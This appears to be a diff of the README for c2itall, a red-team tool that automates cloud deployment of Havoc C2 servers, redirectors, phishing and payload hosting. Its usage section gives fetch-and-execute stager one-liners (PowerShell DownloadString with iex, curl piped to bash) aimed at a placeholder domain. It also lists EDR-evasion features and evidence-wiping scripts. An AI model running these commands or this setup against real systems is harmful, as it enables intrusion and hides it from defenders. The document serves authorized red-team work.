@@ -1,355 +1,314 @@
-# C2ingRed
+# c2itall
 
-A comprehensive automated deployment system for Havoc C2 red team infrastructure.
+Automated deployment of red team infrastructure: attack boxes, Havoc C2
+servers and redirectors, phishing and payload hosting, distributed recon
+nodes, and Phantom privacy services, on more than one cloud, with hardening
+and teardown built in.
 
 ## Overview
 
-C2ingRed enables rapid deployment of complete Command and Control (C2) infrastructure with advanced security hardening, EDR evasion capabilities, and operational security features. Built for professional red team operators, this tool uses Infrastructure as Code principles to efficiently set up Havoc C2 servers, redirectors, and additional components.
+c2itall turns a menu choice into a configured host. Each **workload**
+(attack box, C2, redirector, phishing, payload server, WEBRUNNER, Phantom,
+chat) is described once, in a provider-neutral profile and service play
+beside its module. Each **provider** is a single cloud driver that knows how
+to create, address and destroy VMs. The registry joins the two, so a new
+provider serves every workload and a new workload runs on every driver-backed
+provider without either side being edited. `docs/ARCHITECTURE.md` explains
+the layers; `docs/EXTENDING.md` has the recipes.
 
 ## Features
 
-- **Multi-provider Support**: Azure through a cloud driver that serves every workload; AWS, Linode and FlokiNET through their transition plays. Adding a provider or a workload is a localized change; see `docs/EXTENDING.md`
-- **Infrastructure Components**:
-  - C2 server with Havoc C2 Framework (dev branch)
-  - HTTPS redirectors with security hardening
-  - Email infrastructure with DKIM/DMARC for phishing
-  - Email tracking capabilities
-  - Automated payload generation and delivery
-  - Attack boxes (Kali Linux and custom Ubuntu)
-  - **Quick Recon Box** - Streamlined reconnaissance platform (5-8 min deployment)
-- **Security Features**:
-  - Zero-logging configuration to minimize evidence
-  - Memory protection mechanisms
-  - Command history suppression
-  - Secure exfiltration tunnels
-  - Strong firewall configurations
-  - Fail2Ban and other defensive measures
-- **EDR Evasion**:
-  - Sleep masking
-  - Stack spoofing
-  - AMSI/ETW patching
-  - Indirect syscalls
-  - Binary signature randomization
-- **Operational Capabilities**:
-  - Automated post-exploitation payload building
-  - Reverse shell handler with automatic agent deployment
-  - Let's Encrypt SSL certificate automation
-  - Payload synchronization between C2 and redirectors
-  - Port randomization for OPSEC
+- **Providers**: Azure through a cloud driver that serves every workload;
+  AWS, Linode and FlokiNET through their existing plays behind explicit
+  transition routes.
+- **Workloads**:
+  - Quick Recon Box: Kali with recon tools, Tor, torsocks and proxychains in minutes
+  - Kali and Ubuntu attack boxes (AWS and Linode)
+  - C2 server with the Havoc framework (dev branch), shared mail stack, optional integrated tracker
+  - HTTPS redirectors with legitimate cover pages, security-scanner bouncing and a shell handler
+  - Phishing: MTA front with DKIM/DMARC plus a GoPhish server
+  - Payload server with basic auth, IP, user-agent and rate filtering
+  - WEBRUNNER distributed, geo-targeted masscan/nmap nodes
+  - Phantom privacy services (VPN, DNS, Matrix, email, TAK, vault, media) and a Matrix + Element + Tailscale chat server
+- **Security and OPSEC**: SSH limited to the operator's /32, key-only login,
+  zero-logging mode, command history suppression, memory protection, Fail2Ban,
+  port randomization, secure-exit and log-cleaning scripts.
+- **EDR evasion** on the C2: sleep masking, stack spoofing, AMSI/ETW patching,
+  indirect syscalls, binary signature randomization.
+- **Lifecycle**: durable state written before any resource exists, repeatable
+  deployments, verified cleanup on failure, standalone teardown by ID that
+  works from a fresh process holding no credential.
 
 ## Requirements
 
-- Python 3.6+
-- Ansible 2.9+
-- Provider-specific credentials:
-  - AWS: Access and secret keys
+- Python 3.12 or newer (the Azure flow and its smoke scripts require it)
+- Ansible (installed into the virtualenv by `requirements.txt`)
+- Provider access:
+  - Azure: the Azure CLI (`az`) with a logged-in session, or the automation
+    identity created by `scripts/setup_azure_automation.py`
+  - AWS: access key and secret
   - Linode: API token
-  - FlokiNET: Pre-provisioned servers
-- SSH keypair for server access
-- Registered domain (required for Let's Encrypt certificates)
+  - FlokiNET: pre-provisioned servers
+- A registered domain for workloads that issue Let's Encrypt certificates
+- Your workstation's public IPv4; every firewall rule for SSH is scoped to it
 
 ## Installation
 
 ```bash
-# Clone the repository
-git clone https://github.com/yourusername/C2ingRed.git
-cd C2ingRed
-
-# Install requirements
-pip install -r requirements.txt
-
-# Ensure Ansible is installed
-ansible --version
+git clone <repo-url> c2itall
+cd c2itall
+python3 -m venv venv
+venv/bin/pip install -r requirements.txt
+venv/bin/ansible --version
 ```
+
+Secrets never live in the repository. Provider credentials are read from the
+environment or the vault at deploy time; `providers/<Provider>/vars.yaml`
+holds only non-secret configuration. See `providers/Azure/vars.example.yaml`.
 
 ## Usage
 
-### Azure infrastructure and quick-recon VM
-
-The Azure flow and its smoke-test script require Python 3.12 or newer.
-
-Choose **Tools & Utilities → Infrastructure-only VM**, then **Azure**, or run
-`python3 modules/infrastructure/deploy_infrastructure.py`. The Attack Box menu
-also offers Azure for its Quick Recon Box subtype. These routes create a
-dedicated resource group, network, firewall, static
-Standard IPv4, NIC and Ubuntu 24.04 VM with a 32-GiB StandardSSD managed disk.
-SSH is allowed only from your public IPv4 /32, password login is disabled, and
-normal system logs and managed boot diagnostics remain enabled.
-
-The Azure quick-recon route reuses the provider-neutral task module to install
-the workspace, nmap/DNS tools, Tor, torsocks and proxychains. Its provider owns
-the durable state and deployment key, and standalone teardown uses the saved
-workload identity before removing its active deployment record. Preview its
-non-mutating harness with `python3 scripts/test_azure_attack_box_live.py`; run a
-real deploy/repeat/SSH verification/cleanup cycle by adding `--activate`.
-Kali and full attack-box subtypes are refused because the subscription has not
-accepted the Kali Marketplace image terms; they are not silently mapped to
-Ubuntu. Azure also serves C2, redirector, phishing, payload-server, WEBRUNNER,
-Phantom and chat through the same driver; see the architecture section below.
-
-For unattended use, run
-`python3 scripts/setup_azure_automation.py --activate` once. It creates the
-`c2itall-automation` service principal with Contributor access to the dedicated
-subscription, stores its client ID, private certificate, tenant and subscription
-in Infisical folder `homelab`, and verifies a certificate-based login. Azure routes
-prefer an existing valid CLI session and automatically recover an expired or
-missing session from those Infisical values. Interactive `az login` remains a
-fallback when the automation identity has not been configured. Supply the region,
-VM size and SSH public key explicitly. No Azure SDK package is required;
-the localhost Ansible playbooks use the installed Azure CLI. Register
-`Microsoft.Compute` and `Microsoft.Network` and check regional quota, policy,
-image and SKU availability before deploying. See
-`providers/Azure/vars.example.yaml` for non-secret configuration. The controller
-does not pass other providers' credentials into Azure tasks.
-
-Deployment intent is saved atomically with owner-only permissions under
-`deployments/azure/<deployment_id>.json` before cloud creation. Repeat a deployment
-with the same configuration to update its resources. Recovery uses
-`python3 modules/infrastructure/deploy_infrastructure.py --teardown-id <deployment_id>`;
-the same module's `--teardown-all` and main Cleanup menu also discover
-these files independently of legacy logs. Cleanup refuses foreign groups and
-unexpected resources, cancels active ARM provisioning, and confirms group deletion
-before removing only keys generated for that deployment. Keep failed state files
-for recovery; successful state is retained in `deployments/azure/archive/`.
-Standalone recovery by ID is also supported through
-`python3 teardown.py --deployment-id <deployment_id>` (add `--force` to skip its
-confirmation). It prefers adapter state and uses legacy lookup only when no
-adapter state exists. Standalone `--list`, `--select`, and `--all` also discover
-adapter deployments alongside legacy logs. Matching adapter records take priority;
-unreadable records or conflicting deployment IDs abort discovery before deletion.
-Failed adapter cleanup never retries through legacy cleanup. Batch cleanup reports
-failure through a nonzero exit status if any deployment fails.
-
-Preview the reviewed live smoke with `python3 deploy.py --deploy --azure-smoke --dry-run`.
-Run `python3 scripts/deploy_azure_smoke.py --prepare` for the reviewed commit, push,
-artifact, registration and preflight steps without creating a resource group or VM.
-Preparation cleans its generated key and records a preparation result; it does not
-report a passed live test. Run the actual test with
-`python3 deploy.py --deploy --azure-smoke --activate`, which repeats all preconditions.
-Activation commits approved paths through hooks, pushes and verifies
-`forgejo/public`, archives the committed source, checks a new empty target, and
-tests one temporary VM in East US before cleanup. Live defaults are subscription
-`cc2a66d1-67c2-47ca-856f-19a4eae52cfe` and `Standard_D2as_v4`; the script stops on
-quota, image, SKU or policy failure. SSH uses a dedicated known_hosts file and
-explicit `accept-new` trust on first use; changed keys are rejected. Provisioning
-and validation have a 30-minute deadline, with a separate 10-minute cleanup budget.
-SIGINT/SIGTERM stop controller children and trigger cleanup; SIGKILL or workstation
-loss can leave resources that require the persisted-state recovery command.
-
-The smoke test captures the subscription resource and resource-group inventory
-before provisioning and requires that inventory to be restored before reporting
-success. In an initially empty test subscription, it also removes the default
-East US Network Watcher and its empty group if they are the only additions and
-have no running operations, connection monitors, captures or flow logs. Existing
-monitoring resources are preserved. Unexpected changes or shared-subscription
-additions stop automatic cleanup and are reported for review. This assumes an
-exclusive test subscription during automatic monitoring cleanup; Azure does not
-provide an atomic inventory-and-delete operation across independent controllers.
-
-Tools & Utilities now performs a real read-only Azure connectivity check using
-the CLI's selected subscription. Configuration validation checks Azure inputs and
-the public key when `providers/Azure/vars.yaml` exists; interactive configuration
-does not require that file. Local key cleanup preserves keys referenced by active
-infrastructure state and refuses deletion if that state cannot be read.
-Infrastructure Health Check now reads the owned VM's provisioning and power
-state through its adapter. The same read-only check is available as
-`python3 modules/infrastructure/deploy_infrastructure.py --health`; an unhealthy
-or unavailable check returns failure. An empty result means no tracked adapter
-deployments, not that every cloud resource or legacy workload was checked.
-
-### Provider and workload architecture
-
-Providers and workloads are independent layers joined by the registry in
-`utils/provider_registry.py`. `docs/EXTENDING.md` holds the step-by-step recipes.
-
-- A **workload profile** in `modules/<module>/workload.py` states what the
-  workload needs from any VM provider: inbound rules, image role, disk size,
-  validation, variants, and which configuration keys its provider-neutral
-  service play in `modules/<module>/service.yml` receives.
-- A **cloud driver** (`utils/cloud_driver.py`) is the whole provider contract:
-  plan a VM for a request, create it, report its address, keep durable state,
-  prove it is gone. `utils/azure_cloud.py` is the Azure driver; it never names
-  a workload.
-- **Generic adapters** in `utils/vm_workloads.py` bind any driver to any
-  profile for the single-VM, multi-component, scan-node and handoff shapes,
-  with the recoverable lifecycle (state before creation, verified cleanup on
-  failure, idempotent repeat) shared by all of them.
-- A driver-backed provider's capabilities are derived from the profiles that
-  exist, so it automatically serves `infrastructure`, attack box, C2,
-  redirector, phishing, payload server, WEBRUNNER, Phantom and chat. Explicit
-  routes that would shadow a driver workload are rejected by validation.
-- AWS, Linode and FlokiNET keep their existing plays behind explicit
-  transition routes. Modules use the registered route whenever one exists and
-  fall back to legacy execution only where a provider explicitly retains it.
-  FlokiNET is not offered for Attack Box because it has no matching play.
-- Menus, the WEBRUNNER provider picker and region pools, the connectivity test,
-  configuration validation, health checks, standalone teardown and the live
-  harness ask the registry about providers instead of naming them. The C2
-  menus list the frameworks the C2 profile declares; the attack-box module
-  names only the subtype and each provider maps it to an image.
-
-The read-only coverage audit derives its result from the same registry used
-for dispatch and distinguishes native, transition, legacy-fallback, staged,
-partial-variant and unsupported combinations:
+### Interactive menu
 
 ```bash
-python3 scripts/audit_provider_coverage.py --require-provider azure
+venv/bin/python deploy.py                 # main menu
+venv/bin/python deploy.py --auto-teardown # tear down automatically when a deployment fails
+venv/bin/python deploy.py --help-examples
 ```
 
-Live verification of one provider/workload pair runs through
-`scripts/test_provider_workload_live.py`; the per-provider inventory clients and
-account inputs it uses live in `scripts/live_clouds.py`. The one-node Linode
-WEBRUNNER harness `smoke_test_webrunner.py` remains preview-only unless
-explicitly activated with the operator's public IPv4.
+Main menu entries: Attack Box, C2 Infrastructure, Redirector, Phishing
+Infrastructure, Payload Server, Email Tracker, Chat Server, Privacy Server
+(Phantom), Tools & Utilities, Cleanup & Teardown. Logging Server, Share-Drive
+and Hashtopolis are placeholders.
 
-Phantom enters through the same dispatcher when c2itall launches it. Its AWS,
-Linode and FlokiNET routes are unchanged, while a driver-backed provider
-provisions the VM with rules derived from the selected privacy service (SSH
-limited to the operator /32) and hands it to Phantom's existing hardening and
-service playbooks. `python3 scripts/test_azure_phantom_live.py --activate`
-deploys WireGuard on Azure, repeats against the same resources, verifies the
-service and VM/NSG state over SSH and the CLI, tears down through Phantom and
-requires the subscription inventory to return to its baseline. Evidence lands
-under `logs/azure-phantom-live/`.
+Every workload menu first asks for a provider and offers only the providers
+that can serve that workload and subtype. Tools & Utilities holds SSH key
+generation, a read-only connectivity test and configuration validation for
+every provider, the infrastructure health check, the Umbra recon tools, the
+ops dashboard, Chaos C2 and WEBRUNNER.
 
-**Deploy Chat Server** reuses Phantom's Matrix + Element core, then adds
-Tailscale private networking and optional `matrix-nio` bot runtime/systemd
-scaffolding. It enters through the canonical `chat` workload; the chat profile
-reuses the Phantom profile's rules and disk sizing. A blank Tailscale key
-installs and starts `tailscaled` for later manual authentication; a supplied key
-is handled with Ansible output suppression. Deployment summaries redact
-passwords, auth keys and generated Matrix secrets; owner-only deployment
-information remains available for recovery.
+Module controllers under `modules/` expose a `<module>_menu()` entry point;
+the attack box, C2, redirector, phishing, payload server and chat controllers
+also run directly as scripts (`venv/bin/python modules/c2/deploy_c2.py`). The
+infrastructure-only VM has a standalone CLI:
 
-### Main Menu (Easiest Method)
-
-Simply run:
 ```bash
-python3 deploy.py
+venv/bin/python modules/infrastructure/deploy_infrastructure.py            # deploy a plain VM
+venv/bin/python modules/infrastructure/deploy_infrastructure.py --health   # read tracked VM state
+venv/bin/python modules/infrastructure/deploy_infrastructure.py --teardown-id <id>
+venv/bin/python modules/infrastructure/deploy_infrastructure.py --teardown-all
 ```
 
-This launches the interactive main menu for deployment, providing the most user-friendly experience with guided options for all infrastructure types.
+### Teardown
 
-### Interactive Mode
-
-Alternatively, you can use:
 ```bash
-./deploy.py --interactive
+venv/bin/python teardown.py --list
+venv/bin/python teardown.py --select
+venv/bin/python teardown.py --deployment-id <id> [--force]
+venv/bin/python teardown.py --all [--force]
 ```
 
-This guides you through the deployment process with step-by-step instructions.
+Teardown resolves the same provider route the deployment used. Driver-backed
+providers delete only resources the deployment owns, confirm they are gone,
+then archive the state record and remove keys generated for that deployment.
+A failed native cleanup never falls through to legacy cleanup. The Cleanup
+menu in `deploy.py` offers the same operations plus SSH key and log hygiene.
 
-### Command-line Deployment
+## Providers
 
-#### AWS Deployment:
+| Provider | Route | Notes |
+|---|---|---|
+| Azure | native driver (`utils/azure_cloud.py`) | every workload; durable state under `deployments/azure/` |
+| AWS | transition (`providers/AWS/*.yml`) | attack box (all subtypes), C2, redirector, phishing, payload server, WEBRUNNER, Phantom, chat |
+| Linode | transition (`providers/Linode/*.yml`) | same set as AWS |
+| FlokiNET | transition (`providers/FlokiNET/*.yml`) | C2, redirector, phishing, WEBRUNNER, Phantom, chat; cleanup is manual |
+
+Transition providers run their original localhost plays, which both create
+the instance and configure it. Their repeat behaviour and cleanup are
+whatever those plays do. The coverage audit shows the exact matrix:
+
 ```bash
-./deploy.py --provider aws --aws-key YOUR_KEY --aws-secret YOUR_SECRET \
-            --domain your-domain.com --aws-region us-east-1
+venv/bin/python scripts/audit_provider_coverage.py
+venv/bin/python scripts/audit_provider_coverage.py --require-provider azure
 ```
 
-#### Linode Deployment:
+### Azure
+
+Azure deployments create a dedicated resource group, virtual network,
+network security group, static Standard IPv4, NIC and VM (Ubuntu 24.04, or
+the Kali marketplace image for C2) with a StandardSSD managed disk. SSH is
+allowed only from your public IPv4 /32, password login is disabled, and
+system logs and managed boot diagnostics stay enabled. Service ports come
+from the workload profile. Kali and full attack-box subtypes are refused on
+Azure until the subscription accepts the Kali marketplace terms; only the
+quick-recon subtype has native tasks.
+
+Authentication prefers an existing `az` session and recovers an expired one
+from the automation identity. Run
+`venv/bin/python scripts/setup_azure_automation.py --activate` once to create
+the `c2itall-automation` service principal with Contributor access to the
+dedicated subscription, store its client ID, certificate, tenant and
+subscription in Infisical folder `homelab`, and verify a certificate login.
+Register `Microsoft.Compute` and `Microsoft.Network` and check quota, policy
+and SKU availability in the chosen region before deploying. No Azure SDK is
+required; the driver uses the installed CLI.
+
+State is saved atomically with owner-only permissions under
+`deployments/azure/<deployment_id>.json` before any resource is created.
+Repeating a deployment with the same configuration updates the same
+resources. Recovery by ID works from the Cleanup menu, `teardown.py` and the
+infrastructure module. Successful state moves to `deployments/azure/archive/`;
+failed state is kept for recovery. Cleanup refuses foreign groups and
+unexpected resources, cancels active ARM provisioning and confirms group
+deletion before removing keys generated for that deployment.
+
+The reviewed infrastructure smoke test:
+
 ```bash
-./deploy.py --provider linode --linode-token YOUR_TOKEN \
-            --domain your-domain.com --linode-region us-east
+venv/bin/python deploy.py --deploy --azure-smoke --dry-run    # describe only
+venv/bin/python scripts/deploy_azure_smoke.py --prepare       # commit, push, preflight, no VM
+venv/bin/python deploy.py --deploy --azure-smoke --activate   # one temporary VM in East US
 ```
 
-#### FlokiNET Deployment (with pre-provisioned servers):
-```bash
-./deploy.py --provider flokinet --flokinet-redirector-ip YOUR_REDIRECTOR_IP \
-            --flokinet-c2-ip YOUR_C2_IP --domain your-domain.com
+Activation commits approved paths through hooks, pushes `forgejo/public`,
+archives the committed source, requires an empty target, deploys, verifies
+over SSH, and requires the subscription inventory to return to its baseline.
+It assumes an exclusive test subscription. Live defaults are subscription
+`cc2a66d1-67c2-47ca-856f-19a4eae52cfe` and `Standard_D2as_v4`.
+
+## Architecture in one screen
+
+```
+deploy.py ─► modules/<module>/deploy_<module>.py        controller: prompts, config
+                 │  select_provider / gather_provider_config
+                 ▼
+         utils/provider_registry.py                      who serves what
+                 │
+      ┌──────────┴───────────┐
+      ▼                      ▼
+ driver provider        transition provider
+ utils/vm_workloads     utils/legacy_provider_adapter
+   adapter(driver,        └─► providers/<Dir>/<workload>.yml
+           profile)
+   ├─ utils/<name>_cloud.py        create / address / destroy VMs
+   └─ modules/<module>/workload.py what the VM needs
+      modules/<module>/service.yml how it is configured
 ```
 
-### Deployment Options
+- `modules/<module>/workload.py` is the whole statement of a workload's
+  needs: inbound rules, image role, disk, validation, variants, the config
+  keys its service play receives.
+- `utils/cloud_driver.py` is the whole provider contract; `utils/azure_cloud.py`
+  implements it and never names a workload.
+- `utils/vm_workloads.py` holds the recoverable lifecycles (single VM,
+  multi-component, scan nodes, handoff) shared by every driver and profile.
+- Menus, the WEBRUNNER picker, the connectivity test, validation, health,
+  teardown and the live harness ask the registry about providers instead of
+  naming them.
 
-| Option | Description |
-|--------|-------------|
-| `--redirector-only` | Deploy only the redirector component |
-| `--c2-only` | Deploy only the C2 server component |
-| `--deploy-tracker` | Deploy email tracking server |
-| `--integrated-tracker` | Setup tracker on C2 server instead of separate instance |
-| `--disable-history` | Disable command history on servers |
-| `--secure-memory` | Enable secure memory protection features |
-| `--zero-logs` | Configure zero-logging throughout infrastructure |
-| `--randomize-ports` | Use randomized ports for C2 communications |
-| `--ssh-after-deploy` | Automatically SSH into the server after deployment |
+Full description: `docs/ARCHITECTURE.md`.
 
-## Post-Deployment Steps
+## Extending
 
-After successful deployment:
+- **Add a provider**: one `CloudDriver` subclass in `utils/<name>_cloud.py`
+  and one `ProviderSpec` line. Nothing under `modules/` changes.
+- **Add a workload**: a controller, a profile, a service play and one
+  `WorkloadSpec` line. No provider file changes.
+- **Add a variant**: a catalog entry in the owning profile plus a task file;
+  the menus enumerate the catalog.
 
-1. Configure DNS records for your domain:
+Step-by-step recipes, skeletons and the validation errors you may hit:
+`docs/EXTENDING.md`. `tests/fake_cloud.py` is a complete minimal driver.
+
+## Verification
+
+| Command | Proves |
+|---|---|
+| `venv/bin/python -m pytest tests/ -q` | registry validity, adapter lifecycles, provider/workload isolation, every playbook parses |
+| `venv/bin/python scripts/audit_provider_coverage.py` | the provider/workload coverage matrix |
+| `venv/bin/python scripts/test_provider_workload_live.py --provider <p> --workload <w>` | dry run; add `--activate` for a real deploy, SSH verification, repeat, standalone teardown and inventory restore |
+| `venv/bin/python scripts/test_azure_phantom_live.py --activate` | the Phantom handoff route on Azure |
+| `venv/bin/python smoke_test_webrunner.py --activate --operator-ip <ipv4>` | one-node Linode WEBRUNNER lifecycle |
+
+Live runs write evidence under `logs/<provider>-<workload>-live/<deployment_id>/`
+with the commit they executed from.
+
+## Repository layout
+
+```
+deploy.py                  main menu and CLI entry
+teardown.py                standalone teardown by ID, list, select, all
+modules/<module>/          deploy_<module>.py controller, workload.py profile,
+                           service*.yml plays, tasks/, templates/, files/
+common/tasks|templates|files
+                           hardening, tool install, mail, port randomization shared by plays
+providers/<Provider>/      transition plays, cleanup play, infrastructure play and
+                           templates for driver providers, vars.example.yaml
+utils/provider_registry.py catalog of providers and workloads
+utils/cloud_driver.py      provider contract
+utils/<name>_cloud.py      one driver per provider
+utils/vm_workloads.py      generic adapters
+utils/workloads.py         profile loader
+utils/state_store.py       durable state with locking and archive
+utils/controller_io.py     bounded subprocesses, safe directories
+utils/deployment_engine.py dispatch, playbook execution, deployment records
+utils/cleanup_engine.py    teardown, key and log hygiene
+scripts/                   coverage audit, live harness, Azure smoke and automation setup
+tests/                     unit suite, fake driver, extension contracts
+docs/                      ARCHITECTURE.md, EXTENDING.md
+deployments/<provider>/    durable state and archive
+logs/                      deployment logs, records and live evidence
+ghost_protocol/            Phantom (submodule)
+```
+
+## Post-deployment steps
+
+1. Configure DNS for your domain:
    - `your-domain.com` → C2 server
    - `mail.your-domain.com` → C2 server
-   - `cdn.your-domain.com` → Redirector (or your custom subdomain)
-   - `track.your-domain.com` → Tracker (if deployed)
-
-2. Run post-install scripts on each server:
+   - `cdn.your-domain.com` → redirector (or your chosen subdomain)
+   - `track.your-domain.com` → tracker, if deployed
+2. Run the post-install scripts:
    ```bash
-   # On C2 server
-   /root/Tools/post_install_c2.sh
-   
-   # On redirector
-   /root/Tools/post_install_redirector.sh
+   /root/Tools/post_install_c2.sh          # on the C2 server
+   /root/Tools/post_install_redirector.sh  # on the redirector
    ```
-
-3. Generate Havoc C2 payloads:
+3. Generate Havoc payloads on the C2 server:
    ```bash
-   # On C2 server
    /root/Tools/generate_havoc_payloads.sh
    ```
 
 ## Using Havoc C2
 
-Havoc C2 Framework is installed at `/root/Tools/Havoc` on the C2 server.
-
-### Connecting to the Teamserver
-
-From your local machine:
+Havoc is installed at `/root/Tools/Havoc` on the C2 server; the teamserver
+password is in `/root/Tools/Havoc/data/profiles/default.yaotl`.
 
 ```bash
-# Install Havoc client (development branch)
 git clone -b dev https://github.com/HavocFramework/Havoc.git
-cd Havoc/Client
-mkdir build && cd build
-cmake -GNinja ..
-ninja
-
-# Connect to Teamserver
+cd Havoc/Client && mkdir build && cd build && cmake -GNinja .. && ninja
 ./havoc client --address YOUR_C2_IP:40056 --username admin --password [password]
 ```
 
-The password is stored in `/root/Tools/Havoc/data/profiles/default.yaotl` on the C2 server.
+Payload delivery through the redirector:
 
-### Payload Delivery
-
-PowerShell one-liner for Windows targets:
 ```powershell
 powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://cdn.your-domain.com/windows_stager.ps1')"
 ```
 
-Linux one-liner:
 ```bash
 curl -s https://cdn.your-domain.com/linux_stager.sh | bash
 ```
 
-## Security Considerations
+## Security considerations
 
-- All servers include the `/root/Tools/secure-exit.sh` script to securely wipe operational data
-- The `/root/Tools/clean-logs.sh` script automatically runs to remove evidence
-- Port randomization enhances OPSEC when enabled
-- Set proper DKIM/DMARC records for email operations
-- Consider using ephemeral infrastructure for high-risk operations
-
-## Cleaning Up
-
-To remove all infrastructure when finished:
-
-```bash
-./deploy.py --provider PROVIDER --teardown --deployment-id YOUR_DEPLOYMENT_ID
-```
-
-Add your provider-specific authentication arguments to remove the correct resources.
+- Every server carries `/root/Tools/secure-exit.sh` to wipe operational data
+  and `/root/Tools/clean-logs.sh` to remove evidence.
+- Enable port randomization and zero-logs for sensitive operations.
+- Set DKIM and DMARC records before phishing.
+- Treat infrastructure as disposable; tear it down when the engagement ends.
 
 ## Disclaimer
 
-This tool is intended for authorized red team operations, penetration testing, and security research only. Always obtain proper authorization before conducting security testing. The authors are not responsible for misuse or illegal activities.
+This tool is intended for authorized red team operations, penetration
+testing and security research only. Obtain proper authorization before
+conducting any security testing. The authors are not responsible for misuse.
